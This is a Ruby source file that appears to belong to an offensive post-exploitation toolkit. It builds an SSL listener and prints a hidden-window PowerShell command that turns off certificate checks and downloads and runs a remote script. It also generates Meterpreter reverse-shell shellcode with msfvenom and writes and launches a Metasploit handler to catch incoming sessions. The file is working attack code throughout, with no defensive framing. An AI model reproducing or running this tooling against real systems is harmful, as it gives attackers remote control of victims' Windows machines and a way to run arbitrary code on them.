#!/usr/bin/env ruby
# Thanks to:
# @mattifestation, @obscuresec, and @HackingDave
require 'socket'
require 'openssl'
require 'readline'
module MainCommands
  def print_error(text)
    print "\e[31;1m[-]\e[0m #{text}"
  end
  def print_info(text)
    print "\e[34;1m[*]\e[0m #{text}"
  end
  def print_success(text)
    print "\e[32;1m[+]\e[0m #{text}"
  end
  def get_input(text)
    print "\e[33;1m[!]\e[0m #{text}"
  end
  def file_root
    File.expand_path(File.dirname($0))
  end
  def cert_dir
    file_root + '/certs/'
  end
  def ssl_setup(host, port)
    tcp_server = TCPServer.new(host,port)
    ctx = OpenSSL::SSL::SSLContext.new
    ctx.cert = OpenSSL::X509::Certificate.new(File.open("#{cert_dir}server.crt"))
    ctx.key = OpenSSL::PKey::RSA.new(File.open("#{cert_dir}server.key"))
    server = OpenSSL::SSL::SSLServer.new tcp_server, ctx
    return server
  end
  def powershell_command(url)
    puts %(powershell -windowstyle hidden "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };IEX (New-Object Net.WebClient).DownloadString('#{url}')")
  end
  trap("INT") do
    print_info("Caught CTRL-C Shutting Down!\n")
    exit
  end
end
module MsfCommands
  def available_payloads(payload)
    payloads = {:'1' => 'windows/meterpreter/reverse_https', :'2' => 'windows/meterpreter/reverse_tcp'}
    return payloads[:"#{payload}"]
  end
  def msf_path
    if File.exist?('/usr/bin/msfvenom')
      @msf_path = '/usr/bin/'
    elsif File.exist?('/opt/metasploit-framework/msfvenom')
      @msf_path = ('/opt/metasploit-framework/')
    else
      print_error('Metasploit Not Found!')
      exit
    end
  end
  def generate_shellcode(host,port,payload)
    msf_path
    print_info("Generating shellcode\n")
    execute  = `#{@msf_path}./msfvenom --payload #{payload} LHOST=#{host} LPORT=#{port} C`
    print_success("Shellcode Generated\n")
    shellcode = clean_shellcode(execute)
    return shellcode
  end
  def clean_shellcode(shellcode)
    shellcode = shellcode.gsub('\\', ',0')
    shellcode = shellcode.delete('+')
    shellcode = shellcode.delete('"')
    shellcode = shellcode.delete("\n")
    shellcode = shellcode.delete("\s")
    shellcode[0..4] = ''
    return shellcode
  end
  def metasploit_setup(host,port,payload)
    msf_path
    Dir.mkdir(file_root + '/metaspoit_files/') if not Dir.exists?(file_root + '/metaspoit_files/')
    file_path = file_root + '/metaspoit_files/'
    rc_file = 'msf_listener.rc'
    print_info("Setting up Metasploit this may take a moment\n")
    file = File.open("#{file_path}#{rc_file}",'w')
    file.write("use exploit/multi/handler\n")
    file.write("set PAYLOAD #{payload}\n")
    file.write("set LHOST #{host}\n")
    file.write("set LPORT #{port}\n")
    file.write("set EnableStageEncoding true\n")
    file.write("set ExitOnSession false\n")
    file.write('exploit -j')
    file.close
    system("#{@msf_path}./msfconsole -r #{file_path}#{rc_file}")
  end
end


